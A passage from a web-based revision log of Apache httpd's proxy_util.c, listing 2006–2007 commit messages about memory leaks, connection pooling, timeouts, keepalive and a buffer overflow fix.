  before that could still be buffered in the network filter. This is the case
  if we have sent an EOS bucket or if we actually sent buckets with
  data down the chain. In all other cases we either have not sent any
  buckets at all down the chain or we only sent meta buckets that are
  not EOS buckets down the chain. The only meta bucket that remains in
  this case is the flush bucket which would have removed all possibly
  buffered buckets in the network filter.
  If we sent a flush bucket in the case where not ANY buckets were
  sent down the chain, we break error handling which happens AFTER us.

```

---

Revision [**604449**](/viewvc?view=revision&revision=604449) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=604449&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=604449&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=604449))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=604449)

Modified
*Sat Dec 15 16:19:36 2007 UTC*
(17 years, 1 month ago)
by *rpluem*

File length: 78016 byte(s)

Diff to [previous 604447](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=604447&r2=604449)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=604447&r2=604449&diff_format=h))
```
* Tag the pools appropriately to ease memory debugging.

```

---

Revision [**604447**](/viewvc?view=revision&revision=604447) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=604447&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=604447&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=604447))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=604447)

Modified
*Sat Dec 15 16:15:04 2007 UTC*
(17 years, 1 month ago)
by *rpluem*

File length: 77827 byte(s)

Diff to [previous 603543](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=603543&r2=604447)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=603543&r2=604447&diff_format=h))
```
* Fix a SEGFAULT by ensuring that buckets that may have been buffered in the
  network filters get flushed to the network. This is needed since
  these buckets have been created with the bucket allocator of the
  backend connection. This allocator either gets destroyed if
  conn->close is set or the worker address is not reusable which
  causes the connection to the backend to be closed or it will be used
  again by another frontend connection that wants to recycle the
  backend connection.
  In this case we could run into nasty race conditions (e.g. if the
  next user of the backend connection destroys the allocator before we
  sent the buckets to the network).

  Remark 1: Doing a setaside does not help here as the buckets remain
  created by the wrong allocator in this case.

  Remark 2: Yes, this creates a possible performance penalty in the case
  of pipelined requests as we may send only a small amount of data over
  the wire.

```

---

Revision [**603543**](/viewvc?view=revision&revision=603543) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=603543&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=603543&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=603543))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=603543)

Modified
*Wed Dec 12 10:38:19 2007 UTC*
(17 years, 1 month ago)
by *rpluem*

File length: 75751 byte(s)

Diff to [previous 603502](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=603502&r2=603543)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=603502&r2=603543&diff_format=h))
```
* Do not register connection_cleanup as cleanup for the conn->pool. In the past
  it was needed to register connection_cleanup as a cleanup for the frontend
  connection memory pool (c->pool) to ensure that connection returns into the
  connection pool if the memory pool of the frontend connection memory pool
  gets destroyed / cleared. Now we ensure explicitly the connection returns
  to the connection pool once we finished handling the request.

```

---

Revision [**603502**](/viewvc?view=revision&revision=603502) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=603502&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=603502&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=603502))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=603502)

Modified
*Wed Dec 12 07:44:02 2007 UTC*
(17 years, 1 month ago)
by *rpluem*

File length: 76146 byte(s)

Diff to [previous 603237](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=603237&r2=603502)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=603237&r2=603502&diff_format=h))
```
* Fix another memory leak related to PR 44026. Now that we keep the connection
  data structure alive in the reslist, the live time of c->pool is too long.
  r->pool has the correct live time since rp dies before r.

```

---

Revision [**603237**](/viewvc?view=revision&revision=603237) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=603237&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=603237&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=603237))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=603237)

Modified
*Tue Dec 11 13:27:21 2007 UTC*
(17 years, 1 month ago)
by *rpluem*

File length: 76146 byte(s)

Diff to [previous 602542](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=602542&r2=603237)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=602542&r2=603237&diff_format=h))
```
* Use a separate subpool to manage the data for the socket and the connection
  member of the proxy_conn_rec struct as we destroy this data more frequently
  than other data in the proxy_conn_rec struct like hostname and addr (at least
  in the case where we have keepalive connections that timed out and were
  closed by the backend).
  This fixes a memory leak with short lived and broken connections.

PR: 44026

```

---

Revision [**602542**](/viewvc?view=revision&revision=602542) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=602542&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=602542&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=602542))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=602542)

Modified
*Sat Dec 8 20:10:29 2007 UTC*
(17 years, 1 month ago)
by *rpluem*

File length: 76040 byte(s)

Diff to [previous 583802](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=583802&r2=602542)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=583802&r2=602542&diff_format=h))
```
* Enable the proxy to keep connections persistent in the HTTPS case.

  Basicly the persistence is created by keeping the conn_rec structure
  created for our backend connection (whether http or https) in the connection
  pool. This required to adjust scoreboard.c in a way that its functions can
  properly deal with a NULL scoreboard handle by ignoring the call or returning
  an error code.

```

---

Revision [**583802**](/viewvc?view=revision&revision=583802) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=583802&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=583802&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=583802))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=583802)

Modified
*Thu Oct 11 12:37:09 2007 UTC*
(17 years, 3 months ago)
by *jim*

File length: 74525 byte(s)

Diff to [previous 583466](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=583466&r2=583802)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=583466&r2=583802&diff_format=h))
```
Semi-revert 583466; just remove the ap_proxy_isvalidenc()
function until we canonically set the "allowed" list.

```

---

Revision [**583466**](/viewvc?view=revision&revision=583466) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=583466&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=583466&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=583466))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=583466)

Modified
*Wed Oct 10 13:16:56 2007 UTC*
(17 years, 3 months ago)
by *jim*

File length: 75349 byte(s)

Diff to [previous 580466](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=580466&r2=583466)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=580466&r2=583466&diff_format=h))
```
Abstract out "verification of valid encoding" via
ap_proxy_isvalidenc(). Now we can use it in other
proxy protocols.

```

---

Revision [**580466**](/viewvc?view=revision&revision=580466) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=580466&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=580466&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=580466))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=580466)

Modified
*Fri Sep 28 19:30:37 2007 UTC*
(17 years, 4 months ago)
by *niq*

File length: 74525 byte(s)

Diff to [previous 574843](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=574843&r2=580466)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=574843&r2=580466&diff_format=h))
```
Fix keepalive to proxy backend
PR 43472

```

---

Revision [**574843**](/viewvc?view=revision&revision=574843) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=574843&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=574843&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=574843))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=574843)

Modified
*Wed Sep 12 08:34:40 2007 UTC*
(17 years, 4 months ago)
by *jfclere*

File length: 74493 byte(s)

Diff to [previous 574486](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=574486&r2=574843)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=574486&r2=574843&diff_format=h))
```
lb_score is bigger proxy_worker_stat. Prevent wasting space.

```

---

Revision [**574486**](/viewvc?view=revision&revision=574486) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=574486&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=574486&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=574486))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=574486)

Modified
*Tue Sep 11 06:40:11 2007 UTC*
(17 years, 4 months ago)
by *rpluem*

File length: 74461 byte(s)

Diff to [previous 574269](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=574269&r2=574486)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=574269&r2=574486&diff_format=h))
```
* This check is now part of the PROXY_WORKER_IS_INITIALIZED macro.

```

---

Revision [**574269**](/viewvc?view=revision&revision=574269) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=574269&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=574269&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=574269))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=574269)

Modified
*Mon Sep 10 14:54:01 2007 UTC*
(17 years, 4 months ago)
by *jim*

File length: 74474 byte(s)

Diff to [previous 573939](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=573939&r2=574269)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=573939&r2=574269&diff_format=h))
```
Maintain the illusion. It's not worth my time or
energy to care about this anymore.

```

---

Revision [**573939**](/viewvc?view=revision&revision=573939) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=573939&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=573939&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=573939))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=573939)

Modified
*Sun Sep 9 01:13:38 2007 UTC*
(17 years, 4 months ago)
by *niq*

File length: 74098 byte(s)

Diff to [previous 573911](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=573911&r2=573939)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=573911&r2=573939&diff_format=h))
```
Escape error-notes correctly
PR 40952

```

---

Revision [**573911**](/viewvc?view=revision&revision=573911) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=573911&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=573911&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=573911))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=573911)

Modified
*Sat Sep 8 21:43:47 2007 UTC*
(17 years, 4 months ago)
by *niq*

File length: 74097 byte(s)

Diff to [previous 573903](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=573903&r2=573911)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=573903&r2=573911&diff_format=h))
```
Check all IP addresses listed in ProxyBlock
PR 36987

```

---

Revision [**573903**](/viewvc?view=revision&revision=573903) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=573903&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=573903&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=573903))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=573903)

Modified
*Sat Sep 8 20:29:14 2007 UTC*
(17 years, 4 months ago)
by *niq*

File length: 74060 byte(s)

Diff to [previous 573569](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=573569&r2=573903)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=573569&r2=573903&diff_format=h))
```
mod_proxy: Don't lose bytes when a response line arrives in small chunks.
PR 40894

```

---

Revision [**573569**](/viewvc?view=revision&revision=573569) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=573569&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=573569&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=573569))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=573569)

Modified
*Fri Sep 7 13:13:37 2007 UTC*
(17 years, 4 months ago)
by *jim*

File length: 74018 byte(s)

Diff to [previous 562510](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=562510&r2=573569)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=562510&r2=573569&diff_format=h))
```
Reinstate the lb_score patch, but, protect against
conflicting leakage as per jfc proposal.

```

---

Revision [**562510**](/viewvc?view=revision&revision=562510) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=562510&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=562510&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=562510))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=562510)

Modified
*Fri Aug 3 15:57:27 2007 UTC*
(17 years, 5 months ago)
by *jim*

File length: 74390 byte(s)

Diff to [previous 562069](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=562069&r2=562510)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=562069&r2=562510&diff_format=h))
```
  *) mod_proxy: Improve network performance by setting APR_TCP_NODELAY
     (disable Nagle algorithm) on sockets if implemented.
     PR 42871 [Christian BOITEL <christian_boitel yahoo.fr>, Jim Jagielski]

```

---

Revision [**562069**](/viewvc?view=revision&revision=562069) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=562069&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=562069&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=562069))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=562069)

Modified
*Thu Aug 2 10:17:25 2007 UTC*
(17 years, 5 months ago)
by *niq*

File length: 73801 byte(s)

Diff to [previous 561616](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=561616&r2=562069)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=561616&r2=562069&diff_format=h))
```
Improvement suggested by rpluem to proxy_date fix

```

---

Revision [**561616**](/viewvc?view=revision&revision=561616) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=561616&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=561616&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=561616))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=561616)

Modified
*Wed Aug 1 00:58:20 2007 UTC*
(17 years, 6 months ago)
by *niq*

File length: 74053 byte(s)

Diff to [previous 550514](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=550514&r2=561616)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=550514&r2=561616&diff_format=h))
```
Fix buffer overflow in date handling
PR 41144 (Davi Arnaut)

```

---

Revision [**550514**](/viewvc?view=revision&revision=550514) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=550514&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=550514&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=550514))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=550514)

Modified
*Mon Jun 25 14:29:54 2007 UTC*
(17 years, 7 months ago)
by *jfclere*

File length: 75686 byte(s)

Diff to [previous 546128](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=546128&r2=550514)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=546128&r2=550514&diff_format=h))
```
Fix the timeout logic. The order is now:
1 - worker->timeout
2 - proxy_conf->timeout
3 - server->timeout.
ap_get_module_config() is not perfect by that is easy to port back to 2.2.x.

```

---

Revision [**546128**](/viewvc?view=revision&revision=546128) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=546128&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=546128&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=546128))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=546128)

Modified
*Mon Jun 11 12:40:37 2007 UTC*
(17 years, 7 months ago)
by *jfclere*

File length: 75433 byte(s)

Diff to [previous 535354](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=535354&r2=546128)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=535354&r2=546128&diff_format=h))
```
Arrange the proxy timeout behaviour.

```

---

Revision [**535354**](/viewvc?view=revision&revision=535354) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=535354&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=535354&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=535354))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=535354)

Modified
*Fri May 4 19:12:38 2007 UTC*
(17 years, 8 months ago)
by *jim*

File length: 75121 byte(s)

Diff to [previous 484978](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=484978&r2=535354)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=484978&r2=535354&diff_format=h))
```
Abstract out (kinda) MSG_PEEK. This way when we
actually update APR and apr_socket_recvfrom()
to know about APR_MSG_OOB, APR_MSG_PEEK, etc...
this code won't need to be adjusted. Also,
make nicer for 2.2 backport.

```

---

Revision [**484978**](/viewvc?view=revision&revision=484978) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=484978&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=484978&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=484978))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=484978)

Modified
*Sat Dec 9 13:47:56 2006 UTC*
(18 years, 1 month ago)
by *jim*

File length: 75006 byte(s)

Diff to [previous 484792](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=484792&r2=484978)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=484792&r2=484978&diff_format=h))
```
Isolate the unlock return vals

```

---

Revision [**484792**](/viewvc?view=revision&revision=484792) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=484792&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=484792&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=484792))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=484792)

Modified
*Fri Dec 8 21:37:08 2006 UTC*
(18 years, 1 month ago)
by *jim*

File length: 74967 byte(s)

Diff to [previous 481901](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=481901&r2=484792)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=481901&r2=484792&diff_format=h))
```
Failure to unlock is very nasty, so log it to help
with troubleshooting.

```

---

Revision [**481901**](/viewvc?view=revision&revision=481901) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=481901&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=481901&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=481901))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=481901)

Modified
*Sun Dec 3 21:24:43 2006 UTC*
(18 years, 1 month ago)
by *rpluem*

File length: 74821 byte(s)

Diff to [previous 473278](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=473278&r2=481901)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=473278&r2=481901&diff_format=h))
```
* Ensure that at least scheme://hostname[:port] matches between worker and URL
  when trying to find the worker that fits best to the given URL.

PR: 40910

```

---

Revision [**473278**](/viewvc?view=revision&revision=473278) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=473278&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=473278&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=473278))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=473278)

Modified
*Fri Nov 10 09:15:21 2006 UTC*
(18 years, 2 months ago)
by *mturk*

File length: 74514 byte(s)

Diff to [previous 473276](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=473276&r2=473278)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=473276&r2=473278&diff_format=h))
```
Add alternate is_socket_connected by using APR functions.

```

---

Revision [**473276**](/viewvc?view=revision&revision=473276) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=473276&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=473276&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=473276))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=473276)

Modified
*Fri Nov 10 09:12:57 2006 UTC*
(18 years, 2 months ago)
by *mturk*

File length: 73238 byte(s)

Diff to [previous 470076](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=470076&r2=473276)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=470076&r2=473276&diff_format=h))
```
Remove alternate is_socket_connected detection.

```

---

Revision [**470076**](/viewvc?view=revision&revision=470076) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=470076&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=470076&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=470076))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=470076)

Modified
*Wed Nov 1 20:20:42 2006 UTC*
(18 years, 2 months ago)
by *rpluem*

File length: 74515 byte(s)

Diff to [previous 452327](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=452327&r2=470076)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=452327&r2=470076&diff_format=h))
```
* Assign rv in the if statement to return the correct error code and
  more important an error code at all, as currently APR_SUCCESS is returned
  in the error case.

PR: 40865
Submitted by: Andrew Rucker Jones <arjones simultan.dyndns.org>
Reviewed by: rpluem

```

---

Revision [**452327**](/viewvc?view=revision&revision=452327) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=452327&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=452327&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=452327))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=452327)

Modified
*Tue Oct 3 07:15:46 2006 UTC*
(18 years, 3 months ago)
by *mturk*

File length: 74337 byte(s)

Diff to [previous 451896](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=451896&r2=452327)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=451896&r2=452327&diff_format=h))
```
Add missing include for experimental is_connected.

```

---

Revision [**451896**](/viewvc?view=revision&revision=451896) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=451896&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=451896&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=451896))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=451896)

Modified
*Mon Oct 2 07:06:24 2006 UTC*
(18 years, 3 months ago)
by *mturk*

File length: 74290 byte(s)

Diff to [previous 451580](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=451580&r2=451896)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=451580&r2=451896&diff_format=h))
```
Cleanup alternate is_connected method.
It works for sure on win32,linux and solaris.
I do not have access to other platforms so can not
verify it works on them.

```

---

Revision [**451580**](/viewvc?view=revision&revision=451580) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=451580&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=451580&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=451580))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=451580)

Modified
*Sat Sep 30 11:04:46 2006 UTC*
(18 years, 4 months ago)
by *mturk*

File length: 74500 byte(s)

Diff to [previous 451575](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=451575&r2=451580)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=451575&r2=451580&diff_format=h))
```
Add alternative is_socket_connected implementation.
It works on win32 and linux for sure, so that's why
I put it inside the #ifdef.
Of course something like that needs APR abstraction.

```

---

Revision [**451575**](/viewvc?view=revision&revision=451575) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=451575&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?revision=451575&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?annotate=451575))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?view=log&r1=451575)

Modified
*Sat Sep 30 10:41:51 2006 UTC*
(18 years, 4 months ago)
by *mturk*

File length: 73060 byte(s)

Diff to [previous 443503](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=443503&r2=451575)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/proxy_util.c?r1=443503&r2=451575&diff_format=h))
```
Enable retry=0 for the worker.
This allows to have an option to always retry
the workers in error state instead using a
specified time.

